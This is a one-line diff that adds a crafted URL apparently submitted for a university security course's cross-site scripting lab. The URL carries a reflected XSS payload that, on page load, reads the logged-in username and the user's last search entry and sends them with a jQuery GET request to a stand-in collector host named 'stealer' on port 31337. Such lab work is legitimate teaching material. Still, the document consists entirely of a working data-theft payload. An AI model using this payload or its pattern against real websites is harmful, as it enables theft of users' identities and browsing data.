@@ -1,0 +1,2 @@
+http://cpsc4200.mpese.com/search?xssdefense=1&q=<body%20onload="$(document).ready(function(){var%20username=document.getElementById('logged-in-user').innerHTML;var%20lastSearch=document.getElementById('history-list').innerHTML;var%20lastSearchItem=document.getElementsByClassName('list-group-item')[1];var%20stealerURL='http%3A%2f%2fstealer:31337%2f%3fstolen_user='%2bencodeURIComponent(username)%2b'%26last_search='%2bencodeURIComponent(lastSearchItem);$.get(stealerURL);});">
+
